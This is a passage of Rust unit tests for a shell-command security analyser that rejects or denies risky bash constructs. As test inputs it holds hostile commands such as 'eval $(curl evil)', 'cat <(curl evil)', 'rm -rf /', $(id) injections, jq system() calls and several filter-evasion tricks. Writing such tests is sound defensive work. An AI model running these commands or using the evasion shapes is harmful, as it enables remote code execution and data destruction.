        apply_var_to_scope(&mut scope, "VAR", "/tmp", false);
        assert_eq!(scope.get("VAR").map(String::as_str), Some("/tmp"));
    }

    // resolve_simple_expansion + too_complex are exercised through the parser:
    // build a real `simple_expansion` node and resolve it against a scope.
    fn resolve(cmd: &str, scope: &HashMap<String, String>, inside: bool) -> Result<String, String> {
        let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
        let src = cmd.as_bytes();
        let node = find_kind(tree.root_node(), "simple_expansion").expect("simple_expansion node");
        match resolve_simple_expansion(node, src, scope, inside) {
            Ok(s) => Ok(s),
            Err(ParseForSecurityResult::TooComplex { reason }) => Err(reason),
            Err(other) => panic!("unexpected verdict {other:?}"),
        }
    }

    fn find_kind<'a>(node: Node<'a>, kind: &str) -> Option<Node<'a>> {
        if node.kind() == kind {
            return Some(node);
        }
        let mut cursor = node.walk();
        for c in node.children(&mut cursor) {
            if let Some(found) = find_kind(c, kind) {
                return Some(found);
            }
        }
        None
    }

    #[test]
    fn resolve_tracked_literal_bare_returns_value() {
        let mut scope = HashMap::new();
        scope.insert("VAR".to_string(), "/etc".to_string());
        // Bare $VAR → the REAL literal (so path validation sees /etc).
        assert_eq!(resolve("echo $VAR", &scope, false), Ok("/etc".to_string()));
    }

    #[test]
    fn resolve_tracked_literal_bare_unsafe_rejects() {
        let mut scope = HashMap::new();
        // Glob char: word-splitting / globbing would change argv → reject bare.
        scope.insert("VAR".to_string(), "/etc/*".to_string());
        assert!(resolve("cat $VAR", &scope, false).is_err());
        // Empty bare arg disappears under word-splitting → reject.
        scope.insert("E".to_string(), String::new());
        assert!(resolve("ls $E", &scope, false).is_err());
    }

    #[test]
    fn resolve_tracked_placeholder_inside_string_vs_bare() {
        let mut scope = HashMap::new();
        scope.insert("V".to_string(), VAR_PLACEHOLDER.to_string());
        // Bare → reject; inside string → VAR_PLACEHOLDER.
        assert!(resolve("echo $V", &scope, false).is_err());
        assert_eq!(
            resolve(r#"echo "$V""#, &scope, true),
            Ok(VAR_PLACEHOLDER.to_string())
        );
    }

    #[test]
    fn resolve_untracked_safe_env_only_inside_string() {
        let scope = HashMap::new();
        // $HOME bare → reject; inside string → placeholder.
        assert!(resolve("ls $HOME", &scope, false).is_err());
        assert_eq!(
            resolve(r#"echo "$HOME""#, &scope, true),
            Ok(VAR_PLACEHOLDER.to_string())
        );
        // IFS only safe inside a string (bare $IFS is the injection primitive).
        assert!(resolve("echo $IFS", &scope, false).is_err());
        assert_eq!(
            resolve(r#"echo "$IFS""#, &scope, true),
            Ok(VAR_PLACEHOLDER.to_string())
        );
    }

    #[test]
    fn resolve_special_and_positional_inside_string() {
        let scope = HashMap::new();
        // $? special var, inside a string → placeholder (grammar tags it
        // `special_variable_name`, so `is_special` is true → SPECIAL_VAR_NAMES).
        assert_eq!(
            resolve(r#"echo "$?""#, &scope, true),
            Ok(VAR_PLACEHOLDER.to_string())
        );
        // GRAMMAR DIVERGENCE (over-ask, security-safe): tree-sitter-bash 0.25.1
        // tags positional `$1` as a `variable_name` (text "1"), NOT
        // `special_variable_name` as the TS oracle assumes. So `is_special` is
        // false and the `/^[0-9]+$/` positional branch never fires → `$1`
        // rejects even inside a string. This is a faithful port of the TS LOGIC;
        // the divergence is the grammar's classification, and rejecting is the
        // safe (over-ask) direction. Documented so a later grammar bump can
        // revisit.
        assert!(resolve(r#"echo "$1""#, &scope, true).is_err());
        // Untracked plain var, not safe-env, → reject even inside a string.
        assert!(resolve(r#"echo "$WHATEVER""#, &scope, true).is_err());
    }

    #[test]
    fn parse_smoke_yields_root_for_plain_command() {
        let tree = crate::bash_tree_sitter::parse_raw("ls -la").expect("parse succeeds");
        let root = tree.root_node();
        assert_eq!(root.kind(), "program");
        assert!(!root.has_error(), "plain command parses without ERROR");
        // The empty / over-length cases mirror parser.ts:59 → None.
        assert!(crate::bash_tree_sitter::parse_raw("").is_none());
    }

    #[test]
    fn empty_is_simple_empty() {
        assert_eq!(
            parse_for_security(""),
            ParseForSecurityResult::Simple { commands: vec![] }
        );
        // Whitespace-only trims to empty → simple.
        assert_eq!(
            parse_for_security("   "),
            ParseForSecurityResult::Simple { commands: vec![] }
        );
    }

    #[test]
    fn plain_command_extracts_simple() {
        // L3: an analyzable command is now extracted to Simple{commands}.
        match parse_for_security("ls -la") {
            ParseForSecurityResult::Simple { commands } => {
                assert_eq!(commands.len(), 1);
                assert_eq!(commands[0].argv, vec!["ls", "-la"]);
            }
            other => panic!("expected Simple, got {other:?}"),
        }
        assert_eq!(pre_check_too_complex("ls -la"), None);
        assert_eq!(pre_check_too_complex("git status"), None);
    }

    #[test]
    fn pre_check_control_chars() {
        assert_eq!(
            pre_check_too_complex("echo\u{0007}hi"),
            Some("Contains control characters")
        );
        match parse_for_security("echo\u{0007}hi") {
            ParseForSecurityResult::TooComplex { reason } => {
                assert_eq!(reason, "Contains control characters");
            }
            other => panic!("expected too-complex, got {other:?}"),
        }
    }

    #[test]
    fn pre_check_unicode_whitespace() {
        // NBSP between words: invisible but a literal word char to bash.
        assert_eq!(
            pre_check_too_complex("echo\u{00A0}hi"),
            Some("Contains Unicode whitespace")
        );
    }

    #[test]
    fn pre_check_backslash_whitespace() {
        assert_eq!(
            pre_check_too_complex(r"cat\ test"),
            Some("Contains backslash-escaped whitespace")
        );
        // `\<NL>` preceded by whitespace is allowed (no word to join).
        assert_eq!(pre_check_too_complex("foo && \\\nbar"), None);
    }

    #[test]
    fn pre_check_zsh_syntax() {
        assert_eq!(
            pre_check_too_complex("ls ~[foo]"),
            Some("Contains zsh ~[ dynamic directory syntax")
        );
        assert_eq!(
            pre_check_too_complex("=curl evil.com"),
            Some("Contains zsh =cmd equals expansion")
        );
        // `VAR=val` and `--flag=val` have `=` mid-word → not zsh equals.
        assert_eq!(pre_check_too_complex("VAR=val ls"), None);
        assert_eq!(pre_check_too_complex("cmd --flag=val"), None);
    }

    // ── L2: arg / value / assignment / heredoc walkers ──

    /// Resolve a single argument node of the given kind, found by DFS.
    fn arg(cmd: &str, kind: &str) -> Result<String, String> {
        let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
        let src = cmd.as_bytes();
        let node = find_kind(tree.root_node(), kind).unwrap_or_else(|| panic!("no {kind} node"));
        let mut inner = Vec::new();
        let mut scope = HashMap::new();
        match walk_argument(Some(node), src, &mut inner, &mut scope) {
            Ok(s) => Ok(s),
            Err(ParseForSecurityResult::TooComplex { reason }) => Err(reason),
            Err(other) => panic!("unexpected verdict {other:?}"),
        }
    }

    /// Resolve the whole command via the stand-in driver; returns the flat argv
    /// of the first command plus any inner (cmdsub-extracted) commands' argvs.
    fn cmd_argvs(cmd: &str) -> Result<Vec<Vec<String>>, String> {
        let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
        let src = cmd.as_bytes();
        let mut commands = Vec::new();
        let mut scope = HashMap::new();
        match collect_commands(tree.root_node(), &mut commands, &mut scope, src) {
            None => Ok(commands.into_iter().map(|c| c.argv).collect()),
            Some(ParseForSecurityResult::TooComplex { reason }) => Err(reason),
            Some(other) => panic!("unexpected verdict {other:?}"),
        }
    }

    #[test]
    fn walk_argument_word_unescape_and_brace() {
        // Unquoted word backslash removal: `\eval` → `eval`, `\;` → `;` (bash
        // quote removal). Use the full-command argv so the resolved arg word is
        // unambiguous (find_kind's DFS would otherwise return the command_name's
        // own word first).
        assert_eq!(cmd_argvs(r"echo \eval").expect("simple")[0], vec!["echo", "eval"]);
        assert_eq!(cmd_argvs(r"echo \;").expect("simple")[0], vec!["echo", ";"]);
        // GRAMMAR DIVERGENCE (tree-sitter-bash 0.25.1 vs the TS oracle's node
        // model): the TS runs BRACE_EXPANSION_RE on a `word` node's text, but
        // tsb-0.25.1 tokenizes `{a,b}` into structural brace tokens with an inner
        // `word` of text `"a,b"` (NO braces) — so `walk_argument`'s word-level
        // brace check never fires for a plain `{a,b}`. The check is retained
        // faithfully (it still fires for a word whose literal text contains
        // `{x,y}`, e.g. inside a concatenation), but plain brace expansion must be
        // rejected STRUCTURALLY in the L3 `collect_commands`/`walk_command` layer.
        // ⚠️ FOLLOW-UP (L3 + adversarial verify): confirm `{a,b}` as an argument is
        // rejected end-to-end (it is NOT caught by the pre-checks, which only flag
        // brace+quote). Tracked so the dead word-level path is not mistaken for
        // coverage.
        assert_eq!(arg("{a,b}", "word"), Ok("a,b".to_string()));
    }

    #[test]
    fn walk_argument_raw_string_and_number() {
        assert_eq!(arg("echo '/etc/passwd'", "raw_string"), Ok("/etc/passwd".to_string()));
        // Plain number → its text.
        assert_eq!(arg("sleep 10", "number"), Ok("10".to_string()));
        // `10#$(cmd)` arithmetic-base smuggling: number node WITH a child → reject.
        assert_eq!(
            arg("echo 10#$(id)", "number"),
            Err("Number node contains expansion (NN# arithmetic base syntax)".to_string())
        );
    }

    #[test]
    fn walk_argument_bare_cmdsub_is_too_complex() {
        // `rm $(echo /etc)` — bare command_substitution at arg position must
        // reject (the $() output IS the argument; placeholder would hide the path).
        assert_eq!(
            cmd_argvs("rm $(echo /etc)"),
            Err("Contains command_substitution".to_string())
        );
    }

    #[test]
    fn walk_string_solo_placeholder_rejects() {
        // `"$(cmd)"` alone → solo-placeholder → reject (guard A). The inner
        // command is still extracted before the guard fires; the verdict is the
        // too-complex on the outer string.
        assert_eq!(
            cmd_argvs(r#"cd "$(echo /etc)""#),
            Err("Unhandled node type: string".to_string())
        );
    }

    #[test]
    fn walk_string_literal_plus_cmdsub_extracts_inner() {
        // `echo "SHA: $(git rev-parse HEAD)"` — literal + placeholder is allowed;
        // the inner `git rev-parse HEAD` is extracted as a second command.
        let argvs = cmd_argvs(r#"echo "SHA: $(git rev-parse HEAD)""#).expect("simple");
        assert_eq!(argvs.len(), 2);
        // Inner commands accumulate FIRST (extracted during walkString, before the
        // outer command is pushed): ["git", "rev-parse", "HEAD"].
        assert_eq!(argvs[0], vec!["git", "rev-parse", "HEAD"]);
        // Outer: ["echo", "SHA: __CMDSUB_OUTPUT__"].
        assert_eq!(argvs[1][0], "echo");
        assert_eq!(argvs[1][1], format!("SHA: {CMDSUB_PLACEHOLDER}"));
    }

    #[test]
    fn walk_string_double_quote_escapes_and_newline_kept() {
        // Inside "...": `\"` → `"`, but `\n` (backslash-n) is NOT a real newline
        // here — tree-sitter keeps the literal `\n` two chars; our escape rule
        // only strips `\` before $ ` " \, so `\n` stays `\n`.
        let argvs = cmd_argvs(r#"echo "fix \"bug\"""#).expect("simple");
        assert_eq!(argvs[0][1], r#"fix "bug""#);
    }

    #[test]
    fn walk_string_whitespace_only_quirk_rejects() {
        // tree-sitter attributes a whitespace-only `" "` to the closing quote →
        // no content children. Guard B (text len > 2) → reject.
        assert_eq!(cmd_argvs(r#"echo " ""#), Err("Unhandled node type: string".to_string()));
        // Genuine empty `""` (len == 2) is fine → argv element "".
        let argvs = cmd_argvs(r#"echo """#).expect("simple");
        assert_eq!(argvs[0], vec!["echo".to_string(), String::new()]);
    }

    #[test]
    fn walk_arithmetic_literal_ok_variable_rejects() {
        // `$((1+2))` — literal arithmetic, argv gets the full span verbatim.
        let argvs = cmd_argvs("echo $((1+2))").expect("simple");
        assert_eq!(argvs[0][1], "$((1+2))");
        // `$((x))` references a variable → arithmetic injection → reject.
        let r = cmd_argvs("echo $((x))");
        assert!(
            matches!(&r, Err(reason) if reason.starts_with("Arithmetic expansion references variable or non-literal")),
            "got {r:?}"
        );
    }

    #[test]
    fn walk_variable_assignment_name_guards() {
        let tree = crate::bash_tree_sitter::parse_raw("IFS=x ls").expect("parse");
        let src = "IFS=x ls".as_bytes();
        let node = find_kind(tree.root_node(), "variable_assignment").expect("assignment");
        let mut inner = Vec::new();
        let mut scope = HashMap::new();
        match walk_variable_assignment(node, &mut inner, &mut scope, src) {
            Err(ParseForSecurityResult::TooComplex { reason }) => {
                assert_eq!(reason, "IFS assignment changes word-splitting — cannot model statically");
            }
            other => panic!("expected IFS reject, got {other:?}"),
        }
    }

    #[test]
    fn walk_variable_assignment_ps4_and_tilde() {
        fn assign(cmd: &str) -> Result<VarAssign, String> {
            let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
            let src = cmd.as_bytes();
            let node = find_kind(tree.root_node(), "variable_assignment").expect("assignment");
            let mut inner = Vec::new();
            let mut scope = HashMap::new();
            match walk_variable_assignment(node, &mut inner, &mut scope, src) {
                Ok(ev) => Ok(ev),
                Err(ParseForSecurityResult::TooComplex { reason }) => Err(reason),
                Err(o) => panic!("unexpected {o:?}"),
            }
        }
        // Plain literal assignment.
        assert_eq!(
            assign("VAR=safe ls"),
            Ok(VarAssign {
                name: "VAR".to_string(),
                value: "safe".to_string(),
                is_append: false
            })
        );
        // PS4 with cmdsub → reject (placeholder).
        assert_eq!(
            assign("PS4=$(id) ls"),
            Err("PS4 value derived from cmdsub/variable — runtime unknowable".to_string())
        );
        // PS4 legit charset passes (raw_string `${...}` refs + safe chars).
        assert!(assign(r#"PS4='+${BASH_SOURCE}:${LINENO}: ' ls"#).is_ok());
        // PS4 with a bare `$` (split primitive) is off the allowlist → reject.
        assert_eq!(
            assign(r#"PS4='$ ' ls"#),
            Err("PS4 value outside safe charset — only ${VAR} refs and [A-Za-z0-9 _+:.=/[]-] allowed".to_string())
        );
        // Tilde in value → reject.
        assert_eq!(
            assign("VAR=~/x ls"),
            Err("Tilde in assignment value — bash may expand at assignment time".to_string())
        );
    }

    #[test]
    fn walk_heredoc_redirect_quoting() {
        fn heredoc(cmd: &str) -> Option<String> {
            let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
            let src = cmd.as_bytes();
            let node = find_kind(tree.root_node(), "heredoc_redirect").expect("heredoc");
            match walk_heredoc_redirect(node, src) {
                None => None,
                Some(ParseForSecurityResult::TooComplex { reason }) => Some(reason),
                Some(o) => panic!("unexpected {o:?}"),
            }
        }
        // Quoted delimiter → ok.
        assert_eq!(heredoc("cat <<'EOF'\nx\nEOF"), None);
        // Unquoted delimiter undergoes expansion → reject.
        assert_eq!(
            heredoc("cat <<EOF\nx\nEOF"),
            Some("Heredoc with unquoted delimiter undergoes shell expansion".to_string())
        );
    }

    #[test]
    fn extract_safe_cat_heredoc_body_and_dangerous() {
        fn cat_h(cmd: &str) -> CatHeredoc {
            let tree = crate::bash_tree_sitter::parse_raw(cmd).expect("parse");
            let src = cmd.as_bytes();
            let node = find_kind(tree.root_node(), "command_substitution").expect("cmdsub");
            extract_safe_cat_heredoc(node, src)
        }
        // Safe cat-heredoc → body returned.
        match cat_h(r#"echo "$(cat <<'EOF'
/etc/passwd
EOF
)""#)
        {
            CatHeredoc::Body(b) => assert!(b.contains("/etc/passwd")),
            o => panic!("expected body, got {o:?}"),
        }
        // jq system() in the body → DANGEROUS.
        assert_eq!(
            cat_h(r#"echo "$(cat <<'EOF'
system("id")
EOF
)""#),
            CatHeredoc::Dangerous
        );
    }

    #[test]
    fn walk_string_safe_cat_heredoc_body_appended() {
        // Single-line safe cat-heredoc body must land in argv (so path validation
        // sees the real target), not be dropped.
        let argvs = cmd_argvs(
            r#"rm "$(cat <<'EOF'
/etc/passwd
EOF
)""#,
        )
        .expect("simple");
        // Outer rm argv element is the body (no inner command — cat-heredoc is a
        // static result, not recursed).
        assert_eq!(argvs[0][0], "rm");
        assert_eq!(argvs[0][1], "/etc/passwd");
    }

    #[test]
    fn pre_check_brace_with_quote_and_masking() {
        // Obfuscated brace expansion with a quote → flagged.
        assert_eq!(
            pre_check_too_complex("echo {a'}',b}"),
            Some("Contains brace with quote character (expansion obfuscation)")
        );
        // Quoted JSON payload: the `{` is inside quotes → masked → NOT flagged.
        assert_eq!(pre_check_too_complex(r#"curl -d '{"k":"v"}'"#), None);
        assert_eq!(pre_check_too_complex(r#"curl -d "{\"k\":\"v\"}""#), None);
    }

    // ── L3: walk_command / walk_redirected_statement / walk_file_redirect /
    //        collect_commands / walk_program / parse_for_security ──

    /// Run the full `parse_for_security` pipeline. `Ok(commands)` on Simple;
    /// `Err(reason)` on TooComplex; panic on ParseUnavailable (none of the L3
    /// inputs trip that).
    fn pfs(cmd: &str) -> Result<Vec<SimpleCommand>, String> {
        match parse_for_security(cmd) {
            ParseForSecurityResult::Simple { commands } => Ok(commands),
            ParseForSecurityResult::TooComplex { reason } => Err(reason),
            ParseForSecurityResult::ParseUnavailable => {
                panic!("unexpected ParseUnavailable for {cmd:?}")
            }
        }
    }

    /// Convenience: just the argv vectors.
    fn pfs_argvs(cmd: &str) -> Result<Vec<Vec<String>>, String> {
        pfs(cmd).map(|cs| cs.into_iter().map(|c| c.argv).collect())
    }

    #[test]
    fn l3_simple_command_argv_env_redirect() {
        // Plain command.
        let cs = pfs("git status").expect("simple");
        assert_eq!(cs.len(), 1);
        assert_eq!(cs[0].argv, vec!["git", "status"]);
        assert!(cs[0].env_vars.is_empty());
        assert!(cs[0].redirects.is_empty());
        assert_eq!(cs[0].text, "git status");

        // Env prefix → env_vars, NOT a tracked var (command-local).
        let cs = pfs("FOO=bar ls -l").expect("simple");
        assert_eq!(cs[0].argv, vec!["ls", "-l"]);
        assert_eq!(cs[0].env_vars, vec![("FOO".to_string(), "bar".to_string())]);

        // File redirect on the last command.
        let cs = pfs("echo hi > /tmp/out").expect("simple");
        assert_eq!(cs[0].argv, vec!["echo", "hi"]);
        assert_eq!(cs[0].redirects.len(), 1);
        assert_eq!(cs[0].redirects[0].op, ">");
        assert_eq!(cs[0].redirects[0].target, "/tmp/out");

        // fd-prefixed redirect.
        let cs = pfs("ls 2> /tmp/err").expect("simple");
        assert_eq!(cs[0].redirects[0].op, ">");
        assert_eq!(cs[0].redirects[0].fd, Some(2));
    }

    #[test]
    fn l3_pipeline_extracts_each_stage() {
        let argvs = pfs_argvs("ls -la | grep foo").expect("simple");
        assert_eq!(argvs.len(), 2);
        assert_eq!(argvs[0], vec!["ls", "-la"]);
        assert_eq!(argvs[1], vec!["grep", "foo"]);
    }

    #[test]
    fn l3_list_and_separators() {
        // `&&` carries scope linearly: VAR=push then `git $SUB` resolves.
        let argvs = pfs_argvs("VAR=safe && echo $VAR").expect("simple");
        // VAR=safe is a bare assignment (no command pushed), echo resolves $VAR.
        assert_eq!(argvs.len(), 1);
        assert_eq!(argvs[0], vec!["echo", "safe"]);
    }

    #[test]
    fn l3_flag_omission_attack_rejected() {
        // SECURITY: `true || FLAG=x && cmd $FLAG` — the `||` RHS may not run, so
        // FLAG is NOT carried across the `||`. `$FLAG` then resolves against the
        // post-`||` snapshot (FLAG unset) → bare $FLAG → too-complex (over-ask).
        let r = pfs("true || FLAG=--dry-run && rm $FLAG");
        assert!(r.is_err(), "flag-omission must not be Simple: {r:?}");
    }

    #[test]
    fn l3_subshell_extracts_inner() {
        let argvs = pfs_argvs("(cd /tmp && ls)").expect("simple");
        assert_eq!(argvs.len(), 2);
        assert_eq!(argvs[0], vec!["cd", "/tmp"]);
        assert_eq!(argvs[1], vec!["ls"]);
    }

    #[test]
    fn l3_command_substitution_in_string_extracts_inner() {
        // Inner extracted first, then outer with placeholder.
        let argvs = pfs_argvs(r#"echo "rev: $(git rev-parse HEAD)""#).expect("simple");
        assert_eq!(argvs.len(), 2);
        assert_eq!(argvs[0], vec!["git", "rev-parse", "HEAD"]);
        assert_eq!(argvs[1][0], "echo");
    }

    #[test]
    fn l3_bare_cmdsub_arg_rejected() {
        // `$()` output IS the argument → must reject (placeholder would hide path).
        assert_eq!(
            pfs("rm $(echo /etc)"),
            Err("Contains command_substitution".to_string())
        );
    }

    #[test]
    fn l3_process_substitution_rejected() {
        // process_substitution is in DANGEROUS_TYPES → "Contains process_substitution".
        assert_eq!(
            pfs("diff <(ls) <(ls)"),
            Err("Contains process_substitution".to_string())
        );
    }

    #[test]
    fn l3_brace_expansion_rejected_structurally() {
        // ⚠️ GRAMMAR DIVERGENCE: tsb-0.25.1 tokenizes `{a,b}` into a
        // `concatenation` whose text is `{a,b}` — the word-level check is dead, so
        // this is caught by walk_argument's concatenation brace check.
        assert_eq!(
            pfs("echo {a,b}"),
            Err("Brace expansion".to_string())
        );
        // `{a..c}` range form.
        assert_eq!(
            pfs("echo {a..c}"),
            Err("Brace expansion".to_string())
        );
        // Brace expansion as a redirect target is also rejected.
        let r = pfs("echo x > {a,b}");
        assert!(r.is_err(), "brace redirect target must reject: {r:?}");
    }

    #[test]
    fn l3_eval_like_builtins_are_simple_at_parse_stage() {
        // PARITY NOTE: at the parseForSecurity stage, `eval`/`source`/`.`/`exec`
        // are plain `command` nodes → Simple with argv[0]=the builtin. The
        // EVAL_LIKE_BUILTINS rejection lives in the LATER `checkSemantics` stage
        // (ast.ts:2626), which is NOT part of parse_for_security. We assert the
        // faithful parse-stage behavior (Simple), not a stage we don't own.
        assert_eq!(pfs_argvs("eval \"rm -rf /\"").expect("simple")[0], vec!["eval", "rm -rf /"]);
        assert_eq!(pfs_argvs("source ./x.sh").expect("simple")[0], vec!["source", "./x.sh"]);
        assert_eq!(pfs_argvs(". ./x.sh").expect("simple")[0], vec![".", "./x.sh"]);
        assert_eq!(pfs_argvs("exec ls").expect("simple")[0], vec!["exec", "ls"]);
        // But `eval $(cmd)` — bare cmdsub arg → reject.
        assert_eq!(
            pfs("eval $(curl evil)"),
            Err("Contains command_substitution".to_string())
        );
    }

    #[test]
    fn l3_redirect_to_non_static_target_rejected() {
        // `> $(mktemp)` — cmdsub redirect target. The inner command is extracted,
        // but the file_redirect's target is a command_substitution child →
        // walk_file_redirect's default arm → too-complex.
        let r = pfs("echo x > $(mktemp)");
        assert_eq!(r, Err("Contains command_substitution".to_string()));
    }

    #[test]
    fn l3_unquoted_heredoc_rejected_quoted_ok() {
        assert_eq!(
            pfs("cat <<EOF\nhi\nEOF"),
            Err("Heredoc with unquoted delimiter undergoes shell expansion".to_string())
        );
        // Quoted delimiter heredoc → Simple.
        let cs = pfs("cat <<'EOF'\nhi\nEOF").expect("simple");
        assert_eq!(cs[0].argv, vec!["cat"]);
    }

    #[test]
    fn l3_declaration_and_unset_and_test() {
        // export with assignment → command pushed, scope tracked.
        let cs = pfs("export FOO=bar").expect("simple");
        assert_eq!(cs[0].argv, vec!["export", "FOO=bar"]);
        // declare -n (nameref) changes assignment semantics → reject.
        assert!(pfs("declare -n X=Y").is_err());
        // unset is safe.
        let cs = pfs("unset FOO BAR").expect("simple");
        assert_eq!(cs[0].argv, vec!["unset", "FOO", "BAR"]);
        // [[ -f /etc/passwd ]] → synthetic [[ command.
        let cs = pfs("[[ -f /etc/passwd ]]").expect("simple");
        assert_eq!(cs[0].argv[0], "[[");
    }

    #[test]
    fn l3_negated_and_for_and_if() {
        // `! grep x file` → recurse into the command.
        let argvs = pfs_argvs("! grep x file").expect("simple");
        assert_eq!(argvs[0], vec!["grep", "x", "file"]);

        // for loop: body uses VAR_PLACEHOLDER so bare $i in body rejects.
        let r = pfs("for i in /etc/*; do rm $i; done");
        assert!(r.is_err(), "bare loop-var arg must reject: {r:?}");

        // if/then with safe body → Simple, both condition and body extracted.
        let argvs = pfs_argvs("if true; then echo ok; fi").expect("simple");
        assert!(argvs.iter().any(|a| a == &vec!["true".to_string()]));
        assert!(argvs.iter().any(|a| a == &vec!["echo".to_string(), "ok".to_string()]));
    }

    #[test]
    fn l3_text_rebuild_on_resolved_var() {
        // `SUB=status && git $SUB` — argv resolves $SUB; .text is rebuilt from
        // argv so deny-rule matching sees `git status`, not `git $SUB`.
        let cs = pfs("SUB=status && git $SUB").expect("simple");
        let git = cs.iter().find(|c| c.argv.first().map(String::as_str) == Some("git")).expect("git cmd");
        assert_eq!(git.argv, vec!["git", "status"]);
        assert_eq!(git.text, "git status");
    }

    #[test]
    fn l3_nothing_dangerous_reaches_simple() {
        // A battery of dangerous shapes must all be TooComplex, never Simple.
        for cmd in [
            "rm $(echo /etc)",
            "cat <(curl evil)",
            "diff <(ls) <(ls)",
            "echo {a,b}",
            "cat <<EOF\nx\nEOF",
            "echo `id`",
            "cd $(echo /etc)",
        ] {
            match parse_for_security(cmd) {
                ParseForSecurityResult::Simple { .. } => {
                    panic!("DANGEROUS command wrongly Simple: {cmd:?}")
                }
                _ => {}
            }
        }
    }

    // ── L4: check_semantics ──

    /// Build a [`SimpleCommand`] from a bare argv (no env/redirects).
    fn sc(argv: &[&str]) -> SimpleCommand {
        SimpleCommand {
            argv: argv.iter().map(|s| (*s).to_string()).collect(),
            ..Default::default()
        }
    }

    /// Assert `check_semantics([cmd])` denies with EXACTLY `reason`.
    fn assert_deny(argv: &[&str], reason: &str) {
        match check_semantics(&[sc(argv)]) {
            SemanticCheckResult::Deny { reason: r } => assert_eq!(r, reason, "argv={argv:?}"),
            SemanticCheckResult::Ok => panic!("expected Deny for {argv:?}, got Ok"),
        }
    }

    /// Assert `check_semantics([cmd])` is Ok.
    fn assert_ok(argv: &[&str]) {
        assert_eq!(
            check_semantics(&[sc(argv)]),
            SemanticCheckResult::Ok,
            "expected Ok for {argv:?}"
        );
    }

    #[test]
    fn eval_like_builtins_denied_bare_and_wrapped() {
        for name in ["eval", "source", ".", "exec", "trap", "let"] {
            let reason = format!("'{name}' evaluates arguments as shell code");
            assert_deny(&[name, "id"], &reason);
            // Wrapped in each safe wrapper → the WRAPPED command is checked.
            assert_deny(&["nohup", name, "id"], &reason);
            assert_deny(&["time", name, "id"], &reason);
            assert_deny(&["timeout", "5", name, "id"], &reason);
            assert_deny(&["nice", "-n", "5", name, "id"], &reason);
            assert_deny(&["env", "FOO=bar", name, "id"], &reason);
            assert_deny(&["stdbuf", "-o0", name, "id"], &reason);
        }
    }

    #[test]
    fn timeout_short_kill_flag_does_not_hide_wrapped() {
        // `timeout -k 5 10 eval id` — the SAST regression case. -k 5 consumed,
        // 10 = duration, eval still checked.
        assert_deny(
            &["timeout", "-k", "5", "10", "eval", "id"],
            "'eval' evaluates arguments as shell code",
        );
        // Fused -k5 / -sTERM forms.
        assert_deny(
            &["timeout", "-k5", "10", "eval", "id"],
            "'eval' evaluates arguments as shell code",
        );
        assert_deny(
            &["timeout", "--signal=TERM", "10", "eval", "id"],
            "'eval' evaluates arguments as shell code",
        );
    }

    #[test]
    fn timeout_unknown_flag_and_bad_duration_fail_closed() {
        assert_deny(
            &["timeout", "--bogus", "10", "eval", "id"],
            "timeout with --bogus flag cannot be statically analyzed",
        );
        assert_deny(
            &["timeout", "-Z", "10", "eval", "id"],
            "timeout with -Z flag cannot be statically analyzed",
        );
        // GNU xstrtod accepts `.5` which our duration regex rejects → fail closed.
        assert_deny(
            &["timeout", ".5", "eval", "id"],
            "timeout duration '.5' cannot be statically analyzed",
        );
    }

    #[test]
    fn timeout_alone_is_inert() {
        // `timeout` with no duration/command → name stays 'timeout', not a builtin.
        assert_ok(&["timeout"]);
        assert_ok(&["timeout", "5"]);
    }

    #[test]
    fn nice_expansion_fails_closed() {
        assert_deny(
            &["nice", "$((0-5))", "jq", "system(\"id\")"],
            "nice argument '$((0-5))' contains expansion — cannot statically determine wrapped command",
        );
        // Legacy `nice -10 cmd` strips correctly.
        assert_deny(
            &["nice", "-10", "eval", "id"],
            "'eval' evaluates arguments as shell code",
        );
        assert_ok(&["nice"]);
    }

    #[test]
    fn env_flags_strip_and_fail_closed() {
        // -S splits a string into argv (mini-shell) → reject.
        assert_deny(
            &["env", "-S", "eval id"],
            "env with -S flag cannot be statically analyzed",
        );
        // -u NAME unsets (takes an arg) then wrapped command checked.
        assert_deny(
            &["env", "-u", "PATH", "eval", "id"],
            "'eval' evaluates arguments as shell code",
        );
        assert_ok(&["env"]);
    }

    #[test]
    fn stdbuf_flags_strip_and_fail_closed() {
        // Space-separated long form can't be modeled → reject.
        assert_deny(
            &["stdbuf", "--output", "0", "eval", "id"],
            "stdbuf with --output flag cannot be statically analyzed",
        );
        // -o 0 (space) then -eL then wrapped cmd.
        assert_deny(
            &["stdbuf", "-o", "0", "-eL", "eval", "id"],
            "'eval' evaluates arguments as shell code",
        );
        assert_ok(&["stdbuf"]);
    }

    #[test]
    fn command_v_safe_bare_unsafe() {
        assert_ok(&["command", "-v", "foo"]);
        assert_ok(&["command", "-V", "foo"]);
        // 2.1.195: `command`/`builtin`/`noglob` are command-prefix WRAPPERS — they
        // are stripped and the WRAPPED command is checked.
        assert_ok(&["command", "rm", "-rf", "x"]);
        assert_ok(&["builtin", "echo", "hi"]);
        assert_ok(&["noglob", "echo", "hi"]);
        assert_deny(
            &["command", "eval", "x"],
            "'eval' evaluates arguments as shell code",
        );
        assert_deny(
            &["command", "-x", "foo"],
            "command with -x flag cannot be statically analyzed",
        );
    }

    #[test]
    fn fc_and_compgen_list_safe_exec_unsafe() {
        assert_ok(&["fc", "-l"]);
        assert_ok(&["fc", "-ln"]);
        assert_deny(&["fc", "-e", "ed"], "'fc' evaluates arguments as shell code");
        assert_deny(&["fc", "-s"], "'fc' evaluates arguments as shell code");
        assert_ok(&["compgen", "-c"]);
        assert_ok(&["compgen", "-f"]);
        assert_deny(
            &["compgen", "-C", "id"],
            "'compgen' evaluates arguments as shell code",
        );
        assert_deny(
            &["compgen", "-W", "$(id)"],
            "'compgen' evaluates arguments as shell code",
        );
    }

    #[test]
    fn zsh_dangerous_builtins_denied() {
        assert_deny(
            &["zmodload", "zsh/system"],
            "Zsh builtin 'zmodload' can bypass security checks",
        );
        assert_deny(
            &["zf_rm", "-rf", "/"],
            "Zsh builtin 'zf_rm' can bypass security checks",
        );
    }

    #[test]
    fn subscript_eval_flags_separate_combined_fused() {
        // Separate: printf -v NAME with subscript.
        assert_deny(
            &["printf", "-v", "arr[$(id)]", "x"],
            "'printf -v' operand contains array subscript or runtime-determined value — bash evaluates $(cmd) in subscripts",
        );
        // Combined: read -ra NAME.
        assert_deny(
            &["read", "-ra", "x[$(id)]"],
